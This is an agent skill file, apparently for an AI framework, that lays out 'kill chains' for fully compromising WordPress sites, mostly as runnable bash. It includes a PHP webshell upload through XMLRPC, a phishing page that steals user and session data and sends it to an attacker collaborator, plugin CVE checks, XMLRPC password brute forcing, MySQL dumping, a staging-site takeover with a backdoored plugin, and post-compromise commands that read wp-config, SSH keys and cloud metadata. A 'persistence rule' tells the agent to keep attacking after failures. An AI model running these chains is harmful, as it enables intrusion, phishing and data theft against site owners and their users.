---
name: wordpress-full-compromise
description: Execute optimal kill chains for WordPress full compromise.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
disable-model-invocation: true
metadata:
  hermes:
    tags: [chains, wordpress, RCE, ATO, full-compromise]
    category: chains
    related_skills:
      - cross-attack-chains
      - cors-credential-wordpress
      - xmlrpc-exploitation
      - phpinfo-to-rce
      - wordpress-plugin-hunt
      - wp-mass-recon
      - source-leak-hunt
      - deep-invade
---

# WordPress Full Compromise Skill

End-to-end guide for achieving complete compromise of a WordPress target by executing the most lethal chain available based on the target's specific vulnerability profile. This is the "final boss" skill — it reads the findings from all other skills and selects, executes, and verifies the optimal kill chain.

## When to Use

- All recon phases are complete on a high-value WordPress target.
- Multiple findings are confirmed and you need to pick the best exploitation path.
- You need to demonstrate real impact (RCE, data breach, ATO) for reporting.
- After `cross-attack-chains` mapped the possible chains — this skill executes the best one.

## Prerequisites

- All recon skills executed (at minimum: wp-mass-recon, cors-credential-wordpress, xmlrpc-exploitation, source-leak-hunt, deep-invade).
- Findings consolidated per target with pattern IDs.
- For RCE chains: a listener ready for reverse shells (optional).
- For ATO chains: a victim scenario defined (phishing page, credential theft).

## How to Run

```bash
# 1. Inventory findings
cat findings/TARGET_summary.md

# 2. Select optimal chain based on available ingredients
# Decision tree:
#   Has PHPInfo with exec available + upload vector? → Chain 1 (RCE via PHPInfo)
#   Has CORS + Open Reg + XMLRPC wp.uploadFile? → Chain 2 (RCE via XMLRPC)
#   Has CORS + users with emails? → Chain 3 (ATO via CORS phishing)
#   Has XMLRPC system.multicall? → Chain 4 (Brute force → credential → upload → RCE)
#   Has Plugin CVE < vulnerable version? → Chain 5 (CVE exploitation)
#   Has MySQL open + credentials? → Chain 6 (Data breach)

# 3. Execute the chain and verify
```

**Reference files in this skill:** `references/mailinator-reset-workflow.md` — complete Mailinator API workflow for extracting WordPress registration reset keys and setting your own password. Read it with `skill_view(name="wordpress-full-compromise", file_path="references/mailinator-reset-workflow.md")`.

**`references/subscriber-escalation-notes.md`** — field notes from real subscriber-level WordPress invasion (WP 6.3.1, subdirectory install): what vectors work, what block at subscriber level, cookie auth issues, and key lessons. Includes the complete list of what `wp.getOptions` actually returns as subscriber. Read it with `skill_view(name="wordpress-full-compromise", file_path="references/subscriber-escalation-notes.md")`.

## Quick Reference

### Kill Chain Selection Matrix

| Ingredients Available | Best Chain | Impact | Difficulty |
|----------------------|-----------|--------|------------|
| PHPInfo (exec free) + Upload Vector | Chain 1 — RCE via PHPInfo | Critical | Low |
| CORS + OpenReg + XMLRPC upload | Chain 2 — RCE via XMLRPC | Critical | Low |
| CORS + Users with emails | Chain 3 — ATO via Phishing | Critical | Medium |
| XMLRPC system.multicall + Wordlist | Chain 4 — Brute → RCE | Critical | Medium |
| Plugin CVE (unauthenticated RCE) | Chain 5 — CVE Exploit | Critical | Low |
| MySQL 3306 + Credentials | Chain 6 — Data Breach | Critical | Low |
| Staging install.php + No production | Chain 7 — Site Seizure | Critical | Low |

## Procedure

### Chain 1 — RCE via PHPInfo (Fastest)

```bash
TARGET="$1"

echo "[*] Chain 1: PHPInfo → Upload → RCE"

# Step 1: Confirm exec functions available
DISABLED=$(curl -sk "https://$TARGET/info.php" | grep -A1 'disable_functions' | grep -oP '>[^<]+' | tr -d '>')
if echo "$DISABLED" | grep -qE 'exec|system|passthru|shell_exec'; then
  echo "[-] Exec functions disabled — Chain 1 not viable"
  exit 1
fi
echo "[+] Exec functions available — proceeding"

# Step 2: Find upload vector
# Check open registration
REG=$(curl -sk "https://$TARGET/wp-login.php?action=register" | grep -o 'user_login')
HAS_REG=0
[[ -n "$REG" ]] && HAS_REG=1 && echo "[+] Open registration available"

# Check XMLRPC wp.uploadFile
UPLOAD=$(curl -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
  | grep -o 'wp.uploadFile')
HAS_XMLRPC_UPLOAD=0
[[ -n "$UPLOAD" ]] && HAS_XMLRPC_UPLOAD=1 && echo "[+] XMLRPC wp.uploadFile available"

# Step 3: Execute upload
if [[ $HAS_REG -eq 1 && $HAS_XMLRPC_UPLOAD -eq 1 ]]; then
  echo "[*] Using XMLRPC upload with open registration"

  # 3a: Register user
  USER="recon_$(date +%s)"
  PASS="TestPass123!"
  curl -sk -X POST "https://$TARGET/wp-login.php?action=register" \
    -d "user_login=$USER&user_email=${USER}@evil.com&wp-submit=Register" \
    -o /dev/null

  # 3b: Generate webshell
  cat > /tmp/ws_$TARGET.php << 'WSEOF'
<?php
if(isset($_REQUEST['c'])) {
  echo "<pre>";
  system($_REQUEST['c']);
  echo "</pre>";
} else {
  echo "<!-- OK -->";
}
?>
WSEOF

  # 3c: Upload via XMLRPC
  SHELL_B64=$(base64 -w0 /tmp/ws_$TARGET.php)
  UPLOAD_RESP=$(curl -sk -X POST "https://$TARGET/xmlrpc.php" \
    -H "Content-Type: text/xml" \
    -d "<?xml version=\"1.0\"?>
<methodCall>
  <methodName>wp.uploadFile</methodName>
  <params>
    <param><value><string>1</string></value></param>
    <param><value><string>$USER</string></value></param>
    <param><value><string>$PASS</string></value></param>
    <param><value><struct>
      <member><name>name</name><value><string>cache.php</string></value></member>
      <member><name>type</name><value><string>application/x-php</string></value></member>
      <member><name>bits</name><value><base64>$SHELL_B64</base64></value></member>
    </struct></value></param>
  </params>
</methodCall>")

  # 3d: Extract uploaded file URL
  WEBSHELL_URL=$(echo "$UPLOAD_RESP" | grep -oP 'https?://[^"]+\.php' | head -1)
  if [[ -n "$WEBSHELL_URL" ]]; then
    echo "[+] Webshell uploaded: $WEBSHELL_URL"
  else
    echo "[-] Upload may have failed — check response"
    echo "$UPLOAD_RESP"
  fi
else
  echo "[-] No viable upload vector for Chain 1"
fi

# Step 4: Verify RCE
if [[ -n "$WEBSHELL_URL" ]]; then
  echo ""
  echo "[*] Verifying RCE..."
  RCE_TEST=$(curl -sk "$WEBSHELL_URL?c=id" 2>/dev/null)
  if echo "$RCE_TEST" | grep -q "uid="; then
    echo "[CRITICAL] RCE CONFIRMED!"
    echo "  $(echo "$RCE_TEST" | grep 'uid=')"

    # Gather intelligence
    echo ""
    echo "[*] Host reconnaissance:"
    curl -sk "$WEBSHELL_URL?c=uname%20-a" 2>/dev/null | grep -v '<'
    curl -sk "$WEBSHELL_URL?c=hostname" 2>/dev/null | grep -v '<'
    curl -sk "$WEBSHELL_URL?c=pwd" 2>/dev/null | grep -v '<'
    curl -sk "$WEBSHELL_URL?c=ls%20-la%20../../../" 2>/dev/null | grep -v '<'

    # Extract wp-config.php
    echo ""
    echo "[*] Extracting wp-config.php..."
    curl -sk "$WEBSHELL_URL?c=cat%20../wp-config.php" 2>/dev/null | \
      grep -E 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY' | head -10
  else
    echo "[-] RCE verification failed — webshell may be blocked or at wrong URL"
  fi
fi
```

### Chain 3 — ATO via CORS Phishing

```bash
TARGET="$1"
OUTDIR="/root/output/chains/$TARGET"
mkdir -p "$OUTDIR"

echo "[*] Chain 3: CORS Phishing → Session Hijack → ATO"

# Step 1: Enumerate users via CORS
USERS=$(curl -sk "https://$TARGET/wp-json/wp/v2/users" \
  -H "Origin: https://evil.com" 2>/dev/null | \
  python3 -c "
import sys, json
users = json.load(sys.stdin)
for u in users:
    name = u.get('name', '?')
    slug = u.get('slug', '?')
    uid = u.get('id', '?')
    print(f'  User {uid}: {name} (slug: {slug})')
" 2>/dev/null)

echo "[+] Users exfiltrated:"
echo "$USERS"

# Step 2: Generate phishing page
cat > "$OUTDIR/phish_cors.html" << 'HTMLEOF'
<html><head><title>Session Expired</title>
<style>
body { font-family: Arial; text-align: center; padding-top: 100px; background: #f0f0f0; }
.box { background: white; padding: 30px; max-width: 400px; margin: auto; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
</style></head><body>
<div class="box">
<h2>Session Expired</h2>
<p>Please wait while we restore your session...</p>
<div id="status"></div>
</div>
<script>
var TARGET = "TARGET_PLACEHOLDER";
var EXFIL = "https://YOUR_COLLABORATOR/log";

async function steal() {
  var d = document.getElementById("status");

  // Steal users
  try {
    var r = await fetch("https://" + TARGET + "/wp-json/wp/v2/users?context=edit", {credentials: "include"});
    var users = await r.json();
    d.innerText = "Loading...";

    // Exfiltrate
    new Image().src = EXFIL + "?users=" + btoa(JSON.stringify(users));

    // Steal settings
    r = await fetch("https://" + TARGET + "/wp-json/wp/v2/settings", {credentials: "include"});
    var settings = await r.json();
    new Image().src = EXFIL + "?settings=" + btoa(JSON.stringify(settings));

    // Steal current user
    r = await fetch("https://" + TARGET + "/wp-json/wp/v2/users/me", {credentials: "include"});
    var me = await r.json();
    new Image().src = EXFIL + "?me=" + btoa(JSON.stringify(me));

    d.innerText = "Session restored!";
    setTimeout(function(){ window.location = "https://" + TARGET; }, 2000);
  } catch(e) {
    d.innerText = "Error: " + e;
  }
}
steal();
</script></body></html>
HTMLEOF

# Replace placeholder
sed -i "s/TARGET_PLACEHOLDER/$TARGET/g" "$OUTDIR/phish_cors.html"

echo "[+] Phishing page saved to $OUTDIR/phish_cors.html"
echo "[*] Host this page on your attacker server"
echo "[*] Send link to admin users (see enumerated users above)"
echo "[*] When victim visits, their WP session data is exfiltrated to your collaborator"
```

### Chain 5 — Plugin CVE Exploitation (ElementsKit Example)

```bash
TARGET="$1"

echo "[*] Chain 5: Plugin CVE → RCE"

# Step 1: Confirm ElementsKit version
VERSION=$(curl -sk "https://$TARGET/wp-content/plugins/elementskit-lite/readme.txt" 2>/dev/null | \
  grep -i "stable tag" | sed 's/.*: //' | tr -d '\r')

if [[ -z "$VERSION" ]]; then
  echo "[-] Cannot determine ElementsKit version"
  exit 1
fi

echo "[+] ElementsKit version: $VERSION"

# Step 2: Check if vulnerable (< 2.9.4 for CVE-2023-6853)
MAJOR=$(echo "$VERSION" | cut -d. -f1)
MINOR=$(echo "$VERSION" | cut -d. -f2)
PATCH=$(echo "$VERSION" | cut -d. -f3)

VULNERABLE=0
[[ "$MAJOR" -lt 2 ]] && VULNERABLE=1
[[ "$MAJOR" -eq 2 && "$MINOR" -lt 9 ]] && VULNERABLE=1
[[ "$MAJOR" -eq 2 && "$MINOR" -eq 9 && "$PATCH" -lt 4 ]] && VULNERABLE=1

if [[ "$VULNERABLE" -eq 1 ]]; then
  echo "[+] VULNERABLE! ElementsKit $VERSION < 2.9.4"
  echo "[+] CVE-2023-6853: Unauthenticated arbitrary file upload"
  echo ""
  echo "[*] Exploit: POST to /wp-json/elementskit/v1/layouts/import"
  echo "  Upload a crafted ZIP containing PHP webshell"
  echo "  Access at /wp-content/uploads/elementskit/custom/ws.php"
else
  echo "[-] Version $VERSION >= 2.9.4 — not vulnerable to CVE-2023-6853"
fi

# Step 3: Check other common plugin CVEs
echo ""
echo "[*] Checking other common plugin CVEs..."

# Slider Revolution
REVVER=$(curl -sk "https://$TARGET/wp-content/plugins/revslider/readme.txt" 2>/dev/null | \
  grep -i "stable tag" | sed 's/.*: //' | tr -d '\r')
if [[ -n "$REVVER" ]]; then
  echo "  Slider Revolution: $REVVER"
  [[ "$REVVER" < "6.6.20" ]] && echo "    [VULN] CVE-2024-2534 — RCE via file upload"
fi

# LiteSpeed Cache
LSVER=$(curl -sk "https://$TARGET/wp-content/plugins/litespeed-cache/readme.txt" 2>/dev/null | \
  grep -i "stable tag" | sed 's/.*: //' | tr -d '\r')
if [[ -n "$LSVER" ]]; then
  echo "  LiteSpeed Cache: $LSVER"
  [[ "$LSVER" < "6.5.0" ]] && echo "    [VULN] CVE-2024-50550 — Privilege escalation"
fi

# Gravity Forms
GFVER=$(curl -sk "https://$TARGET/wp-content/plugins/gravityforms/readme.txt" 2>/dev/null | \
  grep -i "stable tag" | sed 's/.*: //' | tr -d '\r')
if [[ -n "$GFVER" ]]; then
  echo "  Gravity Forms: $GFVER"
  [[ "$GFVER" < "2.8.2" ]] && echo "    [VULN] CVE-2024-6115 — Auth bypass"
fi
```

### Chain 2 — RCE via XMLRPC (no PHPInfo needed)

```bash
TARGET="$1"

echo "[*] Chain 2: XMLRPC wp.uploadFile with open registration → RCE"
echo "[*] Prerequisites: XMLRPC wp.uploadFile confirmed + Open registration confirmed"
echo "[*] See xmlrpc-exploitation skill Phase 5 for the full upload → webshell → RCE chain"
echo "[*] Key steps:"
echo "  1. Register user: POST /wp-login.php?action=register"
echo "  2. Upload webshell: POST /xmlrpc.php with wp.uploadFile + base64 PHP"
echo "  3. Access: /wp-content/uploads/YYYY/MM/shell.php?cmd=id"
echo "  4. Verify RCE: curl shell_url?cmd=whoami"

# Quick registration check
REG=$(curl -sk "https://$TARGET/wp-login.php?action=register" | grep -c 'user_login.*wp-submit' || echo 0)
if [[ "$REG" -gt 0 ]]; then
  echo "[+] Open registration confirmed — Chain 2 viable"
else
  echo "[-] No open registration — Chain 2 blocked"
fi
```

### Chain 4 — Brute Force via XMLRPC → Credential → RCE

```bash
TARGET="$1"

echo "[*] Chain 4: XMLRPC system.multicall brute force → credential theft → RCE"
echo "[*] Prerequisites: XMLRPC system.multicall + wordlist"
echo "[*] See xmlrpc-exploitation skill Phase 4 for amplified brute force"
echo ""
echo "[*] Attack flow:"
1. Enumerate users: curl /wp-json/wp/v2/users (target admin ID=1)
2. Build multicall payload: 100 passwords per HTTP request
3. Detect success: response without faultCode 403 = valid credentials
4. Login: wp-login.php with discovered credentials
5. Upload webshell via Media Library or XMLRPC wp.uploadFile
6. RCE

**PERSISTENCE RULE - do NOT stop at first roadblock:** If admin brute fails, do NOT declare the target "defended" or "done." The user will push back. Instead, exhaust ALL escalation paths before giving up:
a. Try targeted wordlists (company name + year + special chars, industry terms, the WP theme name, employee names if known)
b. Check if wp.getOptions as subscriber leaks config detail
c. Try brute forcing OTHER high-value users (editor, author, shop_manager), not just admin
d. Check if registration role defaults to author/subscriber -> wp.editProfile may be partially exploitable
e. Try Application Passwords REST endpoint (may work if cookie session succeeds)
f. Verify no ElementsKit or other plugin provides unauthenticated upload
g. Check if XMLRPC wp.uploadFile has different capability checks than advertised
h. Check if staging subdomain has weaker auth (staging may be on same DB)
Only after ALL 7 paths have been tested can you conclude "blocked."

If ALL escalation paths are confirmed blocked, document each one with evidence ("tested but blocked: X returned 401, Y returned faultCode 403"). Then and only then move on.

# Quick multicall check
XMLRPC_BODY=$(curl -sk -X POST "https://$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName></methodCall>' 2>/dev/null)

if echo "$XMLRPC_BODY" | grep -q "Hello"; then
  echo "[+] XMLRPC active — Chain 4 viable"
  echo "[*] Estimated brute force speed: 1000x amplification vs sequential requests"
else
  echo "[-] XMLRPC blocked or not active — Chain 4 blocked"
fi
```

### Chain 6 — MySQL Open → Data Breach

```bash
TARGET="$1"

echo "[*] Chain 6: MySQL 3306 exposed → brute/credential → full database dump"
echo "[*] Prerequisites: Port 3306 open + credentials (from source leaks or brute force)"
echo "[*] See port-service-discovery skill for banner grab and access testing"
echo ""
echo "[*] Attack flow:"
echo "  1. Banner grab: nc TARGET 3306 (confirms MySQL version)"
echo "  2. Credential source: .env leak, wp-config.php backup, error log mining, JS secrets"
echo "  3. Connect: mysql -h TARGET -u USER -pPASS --skip-ssl"
echo "  4. Dump: SELECT * FROM wp_users; SELECT * FROM wp_posts;"
echo "  5. Exfil: mysqldump -h TARGET -u USER -pPASS --all-databases"

# Check MySQL port
if command -v nmap &>/dev/null; then
  MYSQL_OPEN=$(nmap -p 3306 --open -T4 "$TARGET" 2>/dev/null | grep -c "3306.*open")
  if [[ "$MYSQL_OPEN" -gt 0 ]]; then
    echo "[+] MySQL 3306 OPEN — Chain 6 viable"
    MYSQL_BANNER=$(timeout 5 nc -w 3 "$TARGET" 3306 </dev/null 2>/dev/null | head -1)
    [[ -n "$MYSQL_BANNER" ]] && echo "  Banner: $MYSQL_BANNER"

    echo "[*] Searching for credentials from other findings..."
    echo "  Check source leaks: /root/output/leaks/*.env*.content"
    echo "  Check error logs: /root/output/error_logs/*/intel_summary.md"
    echo "  Check wp-config backups: /root/output/leaks/*wp-config*"
  else
    echo "[-] MySQL 3306 not open — Chain 6 blocked"
  fi
fi
```

### Chain 7 — Staging Site Seizure (install.php takeover)

```bash
TARGET="$1"
STAGING="$2"  # e.g., staging.example.com

if [[ -z "$STAGING" ]]; then
  echo "[*] Chain 7: Staging WordPress install page → site seizure"
  echo "[*] Prerequisites: staging subdomain + /wp-admin/install.php returns HTTP 200"
  echo "[*] See staging-subdomain-hunt skill for staging discovery"
  echo ""
  echo "[*] If you have the staging subdomain, run:"
  echo "  $0 $TARGET staging.$TARGET"
  exit 0
fi

echo "[*] Chain 7: Staging Site Seizure — $STAGING"

# Check install.php
INSTALL_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "https://$STAGING/wp-admin/install.php")
INSTALL_BODY=$(curl -sk --max-time 10 "https://$STAGING/wp-admin/install.php")

if [[ "$INSTALL_CODE" == "200" ]] && echo "$INSTALL_BODY" | grep -q "WordPress"; then
  echo "[+] /wp-admin/install.php HTTP 200 — WordPress NOT configured!"
  echo "[+] STAGING TAKEOVER POSSIBLE"
  echo ""
  echo "[*] Steps to seize the staging site:"
  echo "  1. Visit: https://$STAGING/wp-admin/install.php"
  echo "  2. Fill in: Site Title, admin username, password, email"
  echo "  3. Submit — you are now the WordPress admin of the staging site"
  echo "  4. Upload a plugin with backdoor code"
  echo "  5. The staging server may have connectivity to production (DB, APIs, internal network)"
  echo ""
  echo "[*] Automated via curl (if form structure is standard):"
  echo "  curl -sk -X POST 'https://$STAGING/wp-admin/install.php?step=2' \\"
  echo "    -d 'weblog_title=Test&user_name=admin&admin_password=Hack123!&admin_password2=Hack123!&admin_email=test@evil.com&Submit=Install+WordPress'"

  # Check for upgrade.php (needs DB upgrade — info disclosure)
  UPGRADE_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$STAGING/wp-admin/upgrade.php")
  [[ "$UPGRADE_CODE" == "200" ]] && echo "  [INFO] /wp-admin/upgrade.php also accessible — DB upgrade page"

  # Check for setup-config.php (no wp-config — full config opportunity)
  CONFIG_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$STAGING/wp-admin/setup-config.php")
  [[ "$CONFIG_CODE" == "200" ]] && echo "  [INFO] /wp-admin/setup-config.php accessible — can set up fresh wp-config"
else
  echo "[-] /wp-admin/install.php not accessible (HTTP $INSTALL_CODE) — Chain 7 blocked"
  echo "[-] The staging site may already be configured or the page is blocked"
fi
```

## Post-Compromise Actions

After achieving RCE or ATO:

```bash
# 1. Extract wp-config.php (MySQL root creds)
curl -sk "$WEBSHELL_URL?c=cat%20../wp-config.php"

# 2. Dump user table
curl -sk "$WEBSHELL_URL?c=mysql%20-u%20DB_USER%20-pDB_PASS%20-e%20'SELECT%20*%20FROM%20wp_users'"

# 3. Check for other sites on the server
curl -sk "$WEBSHELL_URL?c=ls%20-la%20/var/www/"

# 4. Check crontab for persistence opportunities
curl -sk "$WEBSHELL_URL?c=crontab%20-l"

# 5. Check for SSH keys
curl -sk "$WEBSHELL_URL?c=cat%20~/.ssh/id_rsa"

# 6. Check for cloud metadata
curl -sk "$WEBSHELL_URL?c=curl%20-s%20http://169.254.169.254/latest/meta-data/"
```

## Pitfalls

- **Application Passwords shown to Subscriber but nonce rejected.** The `/wp-admin/profile.php` page contains the Application Passwords section and an `_wpnonce` for subscriber accounts, BUT the REST API endpoint `/wp-json/wp/v2/users/{id}/application-passwords` returns `rest_cookie_invalid_nonce` (HTTP 403) when the subscriber tries to POST. The nonce is rendered in the page DOM but is ONLY valid for the subscriber's own session cookie

- **wp.getOptions leaks 116+ options even as subscriber but none are sensitive.** The XMLRPC method `wp.getOptions` works with subscriber credentials and returns ~29-116 option structs, but in modern WP (6.x) the returned values are limited to blog metadata (template name, date format, time zone, URLs). **No sensitive values are returned** - `admin_email`, database credentials, SMTP passwords, secret keys, and API tokens are all hidden from subscriber role. Useful for confirming subscriber authentication is real and for basic OSINT (theme name, blog title, URL structure). — not for REST API calls. The subscriber can SEE the feature exists but CANNOT generate tokens. **Don't assume "app passwords section visible = app passwords exploitable."**
- **Subscriber login stays on wp-login.php.** After POST to `/wp-login.php` with valid subscriber creds, the response is HTTP 200 with the login page again — no redirect to wp-admin. The session cookie IS set (look for `wordpress_logged_in_*` and `wordpress_sec_*` cookies in the response headers), but the subscriber role gets redirected back to login. Check the cookie jar, not the redirect URL, to confirm auth. XMLRPC `wp.getUsersBlogs` is the most reliable auth check.

- **XMLRPC upload returns success but file not accessible.** Some hosts block PHP execution in `/wp-content/uploads/`. Try alternative paths or non-PHP extensions.
- **CORS phishing requires victim interaction.** This is a real limitation. Document the social engineering scenario clearly.
- **Plugin CVE requires exact version matching.** "Probably vulnerable" is not enough. Confirm version via readme.txt or REST.
- **WAF blocks webshell access.** If the webshell 404s or 403s on access, try obfuscated filenames or the `.phtml`/`.php5` extension.
- **SUBSCRIBER CANNOT UPLOAD via XMLRPC in modern WP (6.x).** `wp.uploadFile` and `metaWeblog.newMediaObject` both return "Sorry, you are not allowed to upload files." for subscriber role. The Chain 2 (XMLRPC + Open Reg) description above only works if the registration grants Author+ role — check `wp.getProfile` for `roles` array BEFORE trying upload. If subscriber, need escalation first.
- **Mailinator flow: WordPress sends reset LINK, not password.** After registration, WordPress sends an email with a reset link (`wp-login.php?action=rp&key=...&login=...`). You must: (1) fetch the reset page via Mailinator API to extract the key, (2) GET the reset page to get `wp-resetpass-*` cookie, (3) POST new password to `wp-login.php?action=resetpass`. The `rp_key` from the URL is required.
- **Subdirectory WP cookie issues (e.g. `/magical/`).** WordPress in a subdirectory sets `wordpress_sec_*` cookies restricted to `/magical/wp-admin` and `/magical/wp-content/plugins`. The `wordpress_logged_in_*` cookie may not persist properly through curl. Use XMLRPC for authenticated actions instead of cookie-based REST API.
- **`wp.editProfile` returning true ≠ role changed.** WordPress's XMLRPC `wp.editProfile` returns `<boolean>1</boolean>` even when the role field is silently ignored. Always re-check via `wp.getProfile`.
- **Subscriber escalation paths (before Chain 2 can proceed):**
  1. **Brute force admin via system.multicall** — 1000 passwords/request, check response for `isAdmin` or `blogName` (not just faultCode absence).
  2. **ElementsKit CVE-2023-6853** — `admin-ajax.php` may accept `action=elementskit_upload_file` without capability check if nonce is known. Requires profile page access to extract nonce.
  3. **Application Passwords** — REST endpoint `/wp-json/wp/v2/users/{id}/application-passwords` may be accessible to subscriber.
  4. **Check actual default role** — Some plugins change default role from subscriber to author/shop-manager. Verify with `wp.getProfile` immediately after registration.

## Verification

- RCE MUST return `id` or `whoami` command output proving execution on the target server.
- ATO MUST demonstrate access to WordPress admin panel or REST API as a privileged user.
- Data breach MUST include a sample of exfiltrated data (redacted appropriately).
- All chains should be reproducible with the exact commands documented.
- The final state (RCE, ATO, data access) must be captured as evidence for reporting.
